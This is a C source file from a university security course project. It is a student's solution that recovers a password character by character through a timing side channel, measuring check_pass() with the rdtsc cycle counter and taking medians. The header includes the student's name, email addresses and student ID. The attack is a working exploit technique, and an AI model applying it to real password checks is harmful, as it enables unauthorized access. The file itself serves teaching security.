/*******************************************************
 CSE127 Project
 User routines file
 
   Name: 	Angela To 
   Email: 	to.angeac@gmail.com / a4to@ucsd.edu
   Student ID: 	A10657395
   Date:	10/21/15

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 *******************************************************/
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "sysapp.h" // include our "system" header


/* Read cycle counter 
 * Invokes the processesor's cycle counter (a clock that increments by one per 
 * cycle pass). Treat rdtsc() as a free running timer that returns a long.
 * */
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })


/* CMPFUNC : int 
 * Comparison function used for qsort */
int cmpfunc (const void* a, const void* b) {
	return ( *(unsigned long*)a - *(unsigned long*)b );
}


/* COMPUTE_MEDIAN : float
 * Computes the median of array elements */
float compute_median(unsigned long *arr, int arr_len) {
	qsort(arr, arr_len, sizeof(unsigned long), cmpfunc);
	if (arr_len % 2 == 0 ) {
		float m1 = (float)(arr[arr_len/2] + (float)arr[arr_len/2 -1]) / 2.0;
		return m1;
	} else {
		float m2 = arr[arr_len/2];
		return m2;
	}	
}


int main(int argc, char ** argv) {
    	int           BUFFLEN  = 33;
    	int           TRIALS   = 100;
	char*         ascii    = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*(){}[]|:;'<>,.?/~`";
	char          guess_ch = '\0';
	float         max      = 0;
	float         med      = 0;
	int           i        = 0;
	int           j        = 0; 
	int           k        = 0;
	unsigned long t1       = 0;
	unsigned long t2       = 0;
	unsigned long trials[TRIALS];
	char          guess[BUFFLEN];
         
	bzero(guess, sizeof(guess));
	while(1) {
	    for (i = 0; i < BUFFLEN; i++) {
	    	for (j = 0; ascii[j]; j++) {
	    		guess[i] = ascii[j];
			// Run through trials to achieve best guess on char
	    		for (k = 0; k < TRIALS; k++) {
	    			t1 = rdtsc();
	    			if (check_pass(guess)) {
	    				hack_system(guess);
	    			}
	    			t2 = rdtsc();
	    			trials[k] = t2 - t1;
	    		}
			// Grab the the best guess
	    		med = compute_median(trials, TRIALS);
	    		if (med > max) {
	    		    max = med;
	    		    guess_ch = ascii[j];
	    		}
	    	}
	    	// We've guessed the current character, move on
	    	guess[i] = guess_ch;
	    	printf("Guess: %s\n", guess);
	    	
	    	// Reset for next guess
	    	max = 0.0;
	    	guess_ch = '\0';
	    	
		// Do we have the write password ?
	    	if(check_pass(guess)) {
	    	    return 1;
	    	}
	    }
	    // Try again, shouldn't take long
	    printf("Could not get the password!  Last guess was %s\n", guess);
	    printf("%s\n", "Try Again...");
	    bzero(guess, sizeof(guess));
	}
	return 1;
}
